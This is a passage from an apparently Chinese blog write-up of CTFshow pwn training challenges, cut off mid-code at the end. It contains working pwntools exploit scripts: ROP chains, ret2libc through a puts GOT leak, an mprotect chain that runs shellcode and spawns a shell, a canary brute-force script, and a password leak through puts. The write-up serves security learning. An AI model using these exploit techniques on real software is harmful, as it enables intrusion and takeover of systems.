p32(M_addr) +p32(M_size) + p32(M_addr)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pop-edx"><a href="#pop-edx" class="headerlink" title="pop_edx"></a>pop_edx</h3><p>需要解释的点：</p><ul><li><p>为什么要用参数把pop给扔出去呢？<br>因为不扔出去的话，后面的函数无法执行，两种情况</p><ol><li><p>两个函数以上的构成的rop链，下一个函数的地址不能作为上一个函数返回地址</p></li><li><p>第一个函数参数大于等于二的情况下，第二个函数作为返回地址时参数会受到影响</p><p><strong>操作</strong>：<strong>需要通过将参数移动到寄存器从而执行下一个函数（保证ESP在上一个函数执行完之后可以指向下一个函数的开头）</strong></p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 两个函数，下一个函数的地址可以作为上一个函数的返回地址</span></span><br><span class="line">p32(puts) + p32(system) + p32(puts_got) + p32(binsh)</span><br><span class="line"><span class="comment"># 两个函数，下一个函数的地址不能作为上一个函数的返回地址p</span></span><br><span class="line">p32(puts) + p32(pop_edx_ret) + p32(puts_got) + p32(system) + p32(system_ret) + p32(binsh)</span><br><span class="line"><span class="comment"># 第一个函数参数大于等于二的情况下，第二个函数作为返回地址时参数会受到影响</span></span><br><span class="line"><span class="comment"># 错误示范</span></span><br><span class="line">p32(read) + p32(system) + p32(arg1) + p32(arg2) + p32(arg3)</span><br><span class="line"><span class="comment"># 正确示范</span></span><br><span class="line">p32(read) + p32(pop_edx_ebp_edi) + p32(arg1) + p32(arg2) + p32(arg3) + p32(system) + p32(system_ret) + p32(binsh)</span><br><span class="line"><span class="comment"># 复杂情况</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span> + <span class="number">4</span>) + p32(mprotect) + p32(pop_ebx_esi_edi) + p32(M_addr) + p32(M_size) + p32(M_proc)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># read return shellcode</span></span><br><span class="line">payload += p32(read) +p32(pop_ebx_esi_edi) + p32(<span class="number">0</span>) + p32(M_addr) +p32(M_size) + p32(M_addr)</span><br></pre></td></tr></table></figure></li></ul><h2 id="pwn50-mprotect-ret2libc"><a href="#pwn50-mprotect-ret2libc" class="headerlink" title="pwn50(mprotect ret2libc )"></a>pwn50(mprotect ret2libc )</h2><h3 id="彩蛋：解决中文输入法问题"><a href="#彩蛋：解决中文输入法问题" class="headerlink" title="彩蛋：解决中文输入法问题"></a>彩蛋：解决中文输入法问题</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考链接：https://zhuanlan.zhihu.com/p/508797663</span></span><br><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">~/.pam_environment</span><br><span class="line"><span class="comment"># 加入以下几行：</span></span><br><span class="line">GTK_IM_MODULE DEFAULT=fcitx</span><br><span class="line">QT_IM_MODULE DEFAULT=fcitx</span><br><span class="line">XMODIFIERS DEFAULT=@im=fcitx</span><br><span class="line">SDL_IM_MODULE DEFAULT=fcitx</span><br><span class="line"><span class="comment"># 重启即可</span></span><br></pre></td></tr></table></figure><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">puts = elf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gets = elf.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">gets = elf.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">ctfshow = elf.symbols[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x4007e3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">ret = <span class="number">0x4004fe</span>     <span class="comment"># ret</span></span><br><span class="line">buf = <span class="number">0x602050</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts) + p64(ctfshow)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Hello CTFshow&#x27;</span>,payload)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;puts addr&#x27;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    <span class="comment"># 用本地的libc不需要LibcSearcher</span></span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line">    lg(<span class="string">&#x27;system_addr&#x27;</span>,system) </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">    system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">    binsh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+ p64(ret) + p64(pop_rdi) +p64(binsh) + p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Hello CTFshow&#x27;</span>,payload)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure><h3 id="mprotect-（shellcode-记得架构要对）"><a href="#mprotect-（shellcode-记得架构要对）" class="headerlink" title="mprotect （shellcode 记得架构要对）"></a>mprotect （shellcode 记得架构要对）</h3><blockquote><p>注意：对于陌生函数，用man命令可以查看函数原型</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># 找4k开头，ee可写，长度为4k整数倍的内存</span></span><br><span class="line">M_addr = <span class="number">0x601000</span></span><br><span class="line">M_size = <span class="number">0x1000</span></span><br><span class="line">M_prot = <span class="number">0x7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    <span class="comment"># 用本地的libc不需要LibcSearcher</span></span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    pop_rdx_r12 = libc_base + <span class="number">0x000000000011f497</span> <span class="comment"># pop rdx ; pop r12 ; ret</span></span><br><span class="line">    mprotect_addr = libc_base + libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>] </span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line">    lg(<span class="string">&#x27;mprotect_addr&#x27;</span>,mprotect_addr) </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">    pop_rsi_ret = libc_base + <span class="number">0x0000000000023a6a</span></span><br><span class="line">    pop_rdx_ret = libc_base + <span class="number">0x0000000000001b96</span></span><br><span class="line">    mprotect_addr = libc_base + libc.dump(<span class="string">&#x27;mprotect&#x27;</span>)</span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line">    lg(<span class="string">&#x27;mprotect_addr&#x27;</span>,mprotect_addr) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    payload  = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(M_addr)</span><br><span class="line">    payload += p64(pop_rsi_r15)</span><br><span class="line">    payload += p64(M_size)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(pop_rdx_r12)</span><br><span class="line">    payload += p64(M_prot)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(mprotect_addr)</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(M_addr)</span><br><span class="line">    payload += p64(gets)+p64(ret)</span><br><span class="line">    payload += p64(M_addr)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    payload  = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(M_addr)</span><br><span class="line">    payload += p64(pop_rsi_ret)</span><br><span class="line">    payload += p64(M_size)</span><br><span class="line">    payload += p64(pop_rdx_ret)</span><br><span class="line">    payload += p64(M_prot)</span><br><span class="line">    payload += p64(mprotect_addr)</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(M_addr)</span><br><span class="line">    payload += p64(gets)+p64(ret)</span><br><span class="line">    payload += p64(M_addr)    </span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Hello CTFshow&#x27;</span>,payload)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure><h2 id="pwn51-逆向分析漏洞，strcpy函数漏洞"><a href="#pwn51-逆向分析漏洞，strcpy函数漏洞" class="headerlink" title="pwn51(逆向分析漏洞，strcpy函数漏洞)"></a>pwn51(逆向分析漏洞，strcpy函数漏洞)</h2><p>这个题的漏洞是一个I换七个字母IronMan，需要覆盖118个字节，输入16个I即可，逻辑很简单，但是需要逆向分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">back_door = <span class="number">0x0804902E</span></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">16</span> + p32(back_door)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn52（函数传参调试控制）"><a href="#pwn52（函数传参调试控制）" class="headerlink" title="pwn52（函数传参调试控制）"></a>pwn52（函数传参调试控制）</h2><p>这个需要逆向参数，然后根据参数传参即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6C</span>+<span class="number">4</span>) + p32(flag) + p32(<span class="number">0</span>) + p32(a1) + p32(a2)</span><br></pre></td></tr></table></figure><h2 id="pwn53-canary保护与爆破绕过"><a href="#pwn53-canary保护与爆破绕过" class="headerlink" title="pwn53(canary保护与爆破绕过)"></a>pwn53(canary保护与爆破绕过)</h2><p>方法：逐位爆破</p><p>gdb调试查看canary的内存信息，然后写脚本进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /4bx 0x804b04c</span><br><span class="line">0x804b04c &lt;global_canary&gt;:0x310x320x330x31</span><br><span class="line">pwndbg&gt; x /4bs 0x804b04c</span><br><span class="line">0x804b04c &lt;global_canary&gt;:<span class="string">&quot;1231&quot;</span></span><br></pre></td></tr></table></figure><h3 id="爆破脚本"><a href="#爆破脚本" class="headerlink" title="爆破脚本"></a>爆破脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">canary = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 存入每一位爆破成功的值</span></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xFF</span>):</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        p = process(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + canary + p8(c)</span><br><span class="line">        <span class="comment"># 保证后三位不变，line会多一个回车符</span></span><br><span class="line">        p.sendafter(<span class="string">b&#x27;$&#x27;</span>, payload)</span><br><span class="line">        p.recv(<span class="number">1</span>)</span><br><span class="line">        ans = p.recv()</span><br><span class="line">        <span class="built_in">print</span>(ans)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;Canary Value Incorrect!&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> ans:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;The index(<span class="subst">&#123;i&#125;</span>),value(<span class="subst">&#123;c&#125;</span>)&#x27;</span>)</span><br><span class="line">            s.append(<span class="built_in">chr</span>(c))</span><br><span class="line">            canary += p8(c)</span><br><span class="line">            <span class="built_in">print</span>(canary)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;trying... ...&#x27;</span>)</span><br><span class="line">        p.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Canary:&#x27;</span>,canary)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b<span class="string">&#x27;Where is the flag?\n&#x27;</span></span><br><span class="line">The index(3),value(49)</span><br><span class="line">b<span class="string">&#x27;1231&#x27;</span></span><br><span class="line">[<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;1&#x27;</span>]</span><br><span class="line">Canary: b<span class="string">&#x27;1231&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="pwntools：大端序和小端序"><a href="#pwntools：大端序和小端序" class="headerlink" title="pwntools：大端序和小端序"></a>pwntools：大端序和小端序</h3><p>疑问：这里的’1231’为什么传入的时候没有考虑小端序传入呢？</p><p>答：因为这里的每一位使用p8(逐位包装)的，如果字符串用p32(进行包装)，是有小端序问题的，请看内存</p><p>解题代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">flag = elf.symbols[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload += canary</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p32(flag)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;$&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># p.recv()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn54（利用内存布局栈溢出）"><a href="#pwn54（利用内存布局栈溢出）" class="headerlink" title="pwn54（利用内存布局栈溢出）"></a>pwn54（利用内存布局栈溢出）</h2><p>IDA 反汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> input_pass[<span class="number">64</span>]; <span class="comment">// [esp+0h] [ebp-1A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> username[<span class="number">256</span>]; <span class="comment">// [esp+40h] [ebp-160h] BYREF</span></span><br><span class="line">  <span class="type">char</span> password[<span class="number">64</span>]; <span class="comment">// [esp+140h] [ebp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> passwordtxt; <span class="comment">// [esp+180h] [ebp-20h]</span></span><br><span class="line">  _BYTE *lastChr <span class="comment">// [esp+184h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+188h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+18Ch] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+190h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+194h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(password, <span class="number">0</span>, <span class="keyword">sizeof</span>(password));</span><br><span class="line">  <span class="built_in">memset</span>(username, <span class="number">0</span>, <span class="keyword">sizeof</span>(username));</span><br><span class="line">  <span class="built_in">memset</span>(input_pass, <span class="number">0</span>, <span class="keyword">sizeof</span>(input_pass));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;==========CTFshow-LOGIN==========&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Username:&quot;</span>);</span><br><span class="line">  fgets(username, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  lastChr = <span class="built_in">strchr</span>(username, <span class="number">10</span>); <span class="comment">// assic的值是回车键</span></span><br><span class="line">  <span class="keyword">if</span> ( lastChr )</span><br><span class="line">    *lastChr = <span class="number">0</span>;  <span class="comment">// 这里将输入最后的一个回车键变成了字符串终结符/0</span></span><br><span class="line">  <span class="built_in">strcat</span>(username, <span class="string">&quot;,\nInput your Password.&quot;</span>);<span class="comment">// 将这个字符串拼接到username后面</span></span><br><span class="line">  passwordtxt = fopen(<span class="string">&quot;/password.txt&quot;</span>, &amp;unk_8048A30);</span><br><span class="line">  <span class="keyword">if</span> ( !passwordtxt )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/password.txt: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>, v9, v10, v11);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(password, <span class="number">64</span>, passwordtxt);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(username);</span><br><span class="line">  fgets(input_pass, <span class="number">64</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  username[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(input_pass, password) )         </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome! Here&#x27;s what you want:&quot;</span>);</span><br><span class="line">    flag();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">        <span class="string">&quot;You has been banned!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="puts函数特性"><a href="#puts函数特性" class="headerlink" title="puts函数特性"></a>puts函数特性</h3><ul><li><p>特性：puts函数输出的东西遇到空格(\0 \x00)就会截断，遇到回车和制表符不会，运行一下代码即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    puts(<span class="string">&quot;123\n\t456\x00*****&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><blockquote><p><code>\x00</code> 使用了 ASCII 转义序列，其中 <code>\x</code> 表示后面紧跟着两个十六进制数字，表示字符的 ASCII 值。因此，<code>\x00</code> 表示 ASCII 值为 0 的字符。</p><p><code>\0</code> 则是一种更为简短的表示方式，直接使用了八进制转义序列，其中 <code>\0</code> 表示后面紧跟着一个八进制数字，同样表示字符的 ASCII 值。在这种情况下，<code>\0</code> 表示 ASCII 值为 0 的字符。</p></blockquote><p>我的思路</p><ul><li>我当时想着是能不能通过passwd的写入去覆盖原来读入passwd的栈空间，从而强行达到密码一致</li><li>那么问题来了，经过多次实验，发现不可以的，因为这个函数运用的是fgets函数，无法造成栈溢出</li></ul><h3 id="思路-考点"><a href="#思路-考点" class="headerlink" title="思路&amp;考点"></a>思路&amp;考点</h3><ul><li><p>很容易得出栈空间的布局关系</p><ul><li>000001A0 input_passwd</li><li>00000160     username</li><li>00000060     passwd </li><li>00000020     passwdtxt </li><li>0000001C    isOpen</li></ul></li><li><p>思路：如何可以读出栈空间的passwdtxt呢？</p></li><li><p>这里的关键：puts函数（上面有讲解）</p><p>fgets函数会自带一个回车，于是我们可以输入<code>username</code>0x100个字符，这样的栈空间就没有<code>\n</code>的回车符了</p></li></ul><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">passwd = re.findall(<span class="string">&quot;CTF.*\n&quot;</span>,  p.recvuntil(<span class="string">&#x27;You has been banned!&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))[<span class="number">1</span>]</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="pwn55-根据函数调用关系拼接payload"><a href="#pwn55-根据函数调用关系拼接payload" class="headerlink" title="pwn55(根据函数调用关系拼接payload)"></a>pwn55(根据函数调用关系拼接payload)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">flag = elf.symbols[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">flag_func1 = elf.symbols[<span class="string">&#x27;flag_func1&#x27;</span>]</span><br><span class="line">flag_func2 = elf.symbols[<span class="string">&#x27;flag_func2&#x27;</span>]</span><br><span class="line"><span class="comment"># flag argv</span></span><br><span class="line">a1 = <span class="number">0xBDBDBDBD</span></span><br><span class="line"><span class="comment"># flag2 argv </span></span><br><span class="line">a2 = <span class="number">0xACACACAC</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2C</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(flag_func1) </span><br><span class="line">payload += p32(flag_func2)</span><br><span class="line">payload += p32(flag)</span><br><span class="line">payload += p32(a2)</span><br><span class="line">payload += p32(a1)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your flag:&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn56-57-32位-64位-shellcode分析"><a href="#pwn56-57-32位-64位-shellcode分析" class="headerlink" title="pwn56&#x2F;57(32位  64位  shellcode分析)"></a>pwn56&#x2F;57(32位  64位  shellcode分析)</h2><h3 id="32位解析"><a href="#32位解析" class="headerlink" title="32位解析"></a>32位解析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 